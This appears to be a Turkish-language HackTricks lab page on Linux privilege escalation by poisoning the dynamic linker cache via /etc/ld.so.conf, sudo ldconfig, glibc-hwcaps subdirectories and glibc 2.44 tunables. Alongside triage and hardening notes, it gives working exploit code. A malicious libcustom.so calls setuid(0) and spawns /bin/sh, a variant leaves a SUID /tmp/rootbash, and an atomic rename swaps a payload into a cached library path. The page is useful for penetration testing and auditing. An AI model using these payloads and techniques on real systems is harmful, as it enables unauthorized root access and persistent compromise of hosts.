# ld.so privesc exploit örneği

{{#include ../../banners/hacktricks-training.md}}

Bu sayfa, **`/etc/ld.so.conf` veya `ldconfig` üzerinden system linker cache poisoning** için hazırlanmış bir lab çalışmasıdır. Eksik-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` ve diğer generic SUID linker abuse teknikleri için [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md) sayfasına bakın.

## Ortamı hazırlama

Aşağıdaki bölümde, ortamı hazırlamak için kullanacağımız dosyaların code içeriğini bulabilirsiniz.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. Makinenizde aynı klasörde bu dosyaları **oluşturun**
2. **library**'yi **derleyin**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. `libcustom.so` dosyasını `/usr/lib` dizinine **kopyalayın** ve cache'i yenileyin: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root yetkileri)
4. **executable**'ı **derleyin**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Ortamı kontrol edin

_libcustom.so_'nun _/usr/lib_ dizininden **yüklendiğini** ve binary'yi **çalıştırabildiğinizi** kontrol edin.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Yararlı triage komutları

Gerçek bir hedefe saldırırken, binary'nin ihtiyaç duyduğu **exact library name**'i, loader'ın **currently resolving** ettiği şeyi ve canlı cache'i değiştirmeden hangi yapılandırılmış yolların yazılabilir olduğunu doğrulayın.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
"$interp" --inhibit-cache --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```
`ldd` komutunu yalnızca **güvenilir** bir executable üzerinde kullanın. Bazı uygulamalar veya alışılmadık ELF interpreter'ları, attacker-controlled code çalıştırmasına neden olabilir; `objdump -p ./file | grep NEEDED` doğrudan dependencies listesini güvenli şekilde gösterir. Güvenilir bir target için, tespit edilen interpreter'ı `--list` ile çağırmak gerçek resolution'ı gösterir. Bu çıktıyı `--inhibit-cache --list` çıktısıyla karşılaştırın: aradaki fark, object'i sıradan bir search-path kuralının değil, `/etc/ld.so.cache` dosyasının seçtiğini kanıtlar.<sup>[[1]](#references)[[4]](#references)</sup>

Birkaç kullanışlı nokta:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` genellikle **çalışmaz**, çünkü
redirection işlemi mevcut shell'iniz tarafından yapılır. Bunun yerine
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` kullanın.
- **SUID/privileged** binary'ler **secure-execution mode** ile çalışır: `LD_LIBRARY_PATH`
yok sayılırken `LD_PRELOAD` kısıtlanır (slash içeren isimler yok sayılır ve yalnızca
standard directory'lerde setuid işaretli library'ler preload edilebilir). Root
`ldconfig` çalıştırdığında, `/etc/ld.so.conf` içinde listelenen directory'ler
`/etc/ld.so.cache` içine girebilir; dolayısıyla bu misconfiguration privileged
program'ları yine de etkileyebilir.<sup>[[1]](#references)[[2]](#references)</sup>
- `/etc/suid-debug` mevcut olmadığı sürece `LD_DEBUG` de secure-execution mode'da yok sayılır. Bu nedenle privileged execution'dan çıktı beklemek yerine trace'i eşdeğer bir non-SUID çalıştırmadan toplayın.<sup>[[1]](#references)</sup>
- glibc 2.33 ve daha yeni sürümlerde dynamic loader ayrıca
`--list-diagnostics` seçeneğini sunar. Bu seçenek, bir hijack beklenildiği gibi
çalışmadığında machine-readable loader diagnostics ve built-in search-path
bilgilerini yazdırır.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache ve SONAME kısıtlamaları

`ldconfig`, configured directory içindeki her arbitrary file'ı cache'lemez: ELF header'larını inceler, `lib*.so*` veya `ld-*.so*` ile eşleşen isimleri tanır ve geleneksel `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain'ini bekler. Bu nedenle injected object, target architecture/class'a, exact `DT_NEEDED` adına (normalde `DT_SONAME`) ve victim'ın resolve ettiği tüm symbol/version'lara sahip olmalıdır.<sup>[[2]](#references)</sup>
```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```
Hedefe özgü bir library’yi tercih edin; örneğin bu örnekteki gibi. Eksik bir object ile yaygın bir SONAME’i shadowing etmek, hedeflenen privileged process çalışmadan önce onu çözen her process’i bozabilir.<sup>[[3]](#references)</sup>

### Önbelleğe alınmış yol kalıcılığı ve atomik değiştirmeler

Cache, **library name to pathname** eşlemesini kaydeder; shared object’i içine gömmez. Saldırganın kontrolündeki bir pathname cache’e alındıktan sonra, object’in tam olarak bu path’te değiştirilmesi, başka bir `ldconfig` çalıştırılmasına gerek kalmadan yeni başlatılan process’leri etkiler. Bu, kullanışlı bir time-of-check/time-of-use modeli sağlar: yöneticinin cache yeniden oluşturma veya inceleme işlemi sırasında geçerli bir library sunun, ardından payload’ı atomik olarak bunun üzerine rename edin. Mevcut process’ler zaten map edilmiş object’lerini kullanmaya devam eder.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
cache_path=$("$interp" --list ./sharedvuln | awk '/libcustom\.so/{print $3; exit}')
cp ./payload.so "${cache_path}.new"
mv -f "${cache_path}.new" "$cache_path"
```
Aynı şekilde, kötü amaçlı satırın `ld.so.conf` dosyasından silinmesi, önceden yazılmış bir girdiyi tek başına kaldırmaz: yönetici güvenilmeyen nesneyi kaldırmalı, sahipliği/yazma erişimini düzeltmeli ve cache'i yeniden oluşturmalıdır. Hâlâ etkin bir yapılandırma yolundan kalan cache girdisini ayırt etmek için yukarıdaki `--inhibit-cache` karşılaştırmasını kullanın.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit

Bu senaryoda, bir yöneticinin sistemin
`/etc/ld.so.conf` dosyası tarafından dahil edilen `/etc/ld.so.conf.d/`
altındaki bir dosyaya güvenlik açığı bulunan bir girdi eklediğini varsayalım.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Savunmasız klasör _/home/ubuntu/lib_ (yazma erişimimizin olduğu) klasörüdür.\
**Aşağıdaki kodu bu yolun içinde indirin ve derleyin:**
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setgid(0);
setuid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Daha sonra **root** (veya başka bir ayrıcalıklı hesabın) vulnerable binary'yi çalıştırmasını bekliyorsanız, interactive shell başlatmak yerine genellikle **root-owned artifact** bırakmak daha iyidir. Örneğin:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Ardından, ayrıcalıklı çalıştırma gerçekleştiğinde `/tmp/rootbash -p` kullanabilirsiniz.

Artık **kötü amaçlı libcustom kütüphanesini yanlış yapılandırılmış** yolun içine **oluşturduğumuza göre**, varsayılan önbellek başarılı bir ayrıcalıklı **`ldconfig`** çalıştırmasıyla yeniden oluşturulmalıdır. Yeniden başlatma yalnızca yerel önyükleme süreci gerçekten bunu çağırıyorsa yardımcı olur; aksi takdirde bir yönetici işlemi bekleyin veya mevcutsa güvenli olmayan bir sudo kuralı kullanın.<sup>[[2]](#references)</sup>

Bu gerçekleştikten sonra, `sharedvuln` executable'ının `libcustom.so` kütüphanesini nereden yüklediğini **yeniden kontrol edin**:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Gördüğünüz gibi **`/home/ubuntu/lib` konumundan yüklüyor** ve herhangi bir kullanıcı bunu çalıştırırsa bir shell çalıştırılacak:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Bu örnekte henüz yetkileri yükseltmediğimizi unutmayın; ancak yürütülen komutları değiştirip **root veya başka bir ayrıcalıklı kullanıcının savunmasız binary'yi çalıştırmasını bekleyerek** yetkileri yükseltebileceğiz.

### Modern `glibc-hwcaps` shadowing

glibc 2.33'ten beri loader, **her kütüphane arama dizini** içindeki `glibc-hwcaps/<level>/` altında bulunan optimize edilmiş kütüphaneleri tercih edebilir. Sonuç olarak yalnızca `/home/ubuntu/lib` dizinini kontrol etmek yeterli değildir: `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` gibi yazılabilir ve uyumlu bir alt dizin, `ldconfig` bunu indeksledikten sonra temel kütüphaneyi gölgeleyebilir; diğer CPU'lar ise temel nesneyi kullanmaya devam eder. Bu ayrıca, doğrulama farklı bir CPU üzerinde gerçekleştirildiğinde gözden kaçabilecek, mimariye seçici bir hijack sağlar.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
-o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```
Mevcut glibc hardening yönergeleri, duplicate SONAME'lerden, non-default search locations'lardan ve `glibc-hwcaps` alt dizinlerindeki object'lerden kaçınılmasını önerir. Audit açısından, yapılandırılmış dizinlere ve bunların parent path component'lerine ownership ve writeability kontrollerini recursive olarak uygulayın.<sup>[[3]](#references)</sup>

### Diğer misconfiguration'lar - Aynı vuln

Önceki örnekte, bir administrator'ın **bir configuration file içine, `/etc/ld.so.conf.d/` içindeki non-privileged bir folder'ı ayarladığı** bir misconfiguration'ı taklit etmiştik.\
Ancak aynı vulnerability'ye neden olabilecek başka misconfiguration'lar da vardır: yüklenen bir **config file** üzerinde **write permissions**'ınız varsa, writable bir `/etc/ld.so.conf.d/` directory'si içinde file oluşturabiliyorsanız veya `/etc/ld.so.conf` üzerine yazabiliyorsanız aynı vulnerability'yi configure edip exploit edebilirsiniz.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**`ldconfig` üzerinde sudo privileges'ınız olduğunu varsayalım**. `ldconfig`, scan directories'yi positional arguments olarak kabul eder; bu nedenle cache-poisoning'in en kısa formu çoğu zaman şu şekildedir:<sup>[[2]](#references)</sup>
```bash
sudo ldconfig /tmp
```
Alternatif olarak, `-f` varsayılan önbellek çıktısını korurken başka bir yapılandırma dosyası seçer. Bu, bir bağımsız değişken filtresinin konumsal dizinleri engelleyip yine de `-f` seçeneğine izin verdiği veya birden fazla yolun enjekte edilmesi gerektiği durumlarda kullanışlıdır:<sup>[[2]](#references)</sup>
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Şimdi, **önceki exploit** bölümünde belirtildiği gibi, **kötü amaçlı kütüphaneyi `/tmp` içinde oluşturun**.\
Ve son olarak, yolu yükleyip binary'nin kütüphaneyi nereden yüklediğini kontrol edelim:
```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Gördüğünüz gibi, `ldconfig` üzerinde sudo ayrıcalıklarına sahip olarak aynı güvenlik açığından yararlanabilirsiniz.** Kısıtlanmış bir sudo kuralını değerlendirirken seçenek ayrıntıları önemlidir: `-f` başka bir yapılandırma seçer ancak yine de `/etc/ld.so.cache` dosyasını yeniden oluşturur; `-C` cache'i başka bir konuma yönlendirir; `-N` cache'in yeniden oluşturulmasını engeller; `-X` ise link güncellemelerini engeller ancak **`-N` ile birlikte kullanılmadığı sürece cache'i yine de yeniden oluşturur**. `-n`, `-N` anlamına gelir; bu nedenle belirtilen dizinlerde linkleri güncelleyebilir ancak cache'i zehirleyemez; `-r`, alternatif bir root altında çalışır ve normalde host cache'ini değiştirmez.<sup>[[2]](#references)</sup>

## glibc 2.44: önbelleğe alınmış sistem genelindeki tunables

glibc 2.44 ile başlayan `ldconfig`, `/etc/tunables.conf` dosyasını da ayrıştırır ve ayarlarını `/etc/ld.so.cache` içine bir uzantı olarak kaydeder. Dosya `include` yönergelerini ve işlem başına filtreleri kabul eder. Prefix'ler kapsamı kontrol eder: `@` yalnızca `AT_SECURE` işlemlerini hedefler, `$` bunları hariç tutar ve `*` her ikisini de kapsar. Bu, denetim sınırını library dizinlerinin ötesine taşır: yazılabilir bir tunables yapılandırması veya dahil edilen bir dosya, ayrıcalıklı bir cache yeniden oluşturma işleminden sonra gelecekteki program başlangıçlarını etkileyebilir.<sup>[[7]](#references)</sup>

Aynı sürüm, normal cache'e yazmaya devam ederken alternatif bir tunables dosyası seçen `ldconfig -t TUNCONF` seçeneğini ekler; bunu başka bir seçenek değiştirir. Bu nedenle yalnızca `-f` seçeneğini engellemeye çalışan wrapper'lar ve sudo kuralları `-t` seçeneğini, rastgele positional dizinleri ve cache çıktısının manipülasyonunu da reddetmelidir.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
# Detection / lab-only proof of cache influence
find /etc/tunables.conf -writable -ls 2>/dev/null
grep -nE '^[[:space:]]*include' /etc/tunables.conf 2>/dev/null
ldconfig --help | grep -E 'TUNCONF|tunables'
printf '*glibc.malloc.check=3\n' > /tmp/evil.tunconf
sudo ldconfig -t /tmp/evil.tunconf
"$interp" --list-tunables | grep -F glibc.malloc.check
sudo ldconfig                         # rebuild from the real configuration
```
Bu, otomatik olarak arbitrary code execution değildir. Ayrıcalıklı bir **loader-behavior manipulation** primitive'idir: glibc, sistem genelindeki değerlerin setuid/setgid programlarına her tunable için ayrı güvenlik taraması yapılmadan güvenlik açısından hassas tunable'lar uygulayabileceği konusunda açıkça uyarır. `--list-tunables` ile host'un gerçek tunable'larını enumerate edin ve evrensel bir payload varsaymak yerine hedefe özgü allocator değişikliklerini, CPU-hardening değişikliklerini veya denial-of-service koşullarını arayın.<sup>[[7]](#references)</sup>



## References

- [1] [ld.so(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux kılavuz sayfası](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
- [7] [System-wide Tunables (GNU C Library 2.44)](https://sourceware.org/glibc/manual/2.44/html_node/System_002dwide-Tunables.html)
- [8] [Add system-wide tunables: ldconfig part (patch v6 1/4)](https://sourceware.org/pipermail/libc-alpha/2026-March/175984.html)
{{#include ../../banners/hacktricks-training.md}}
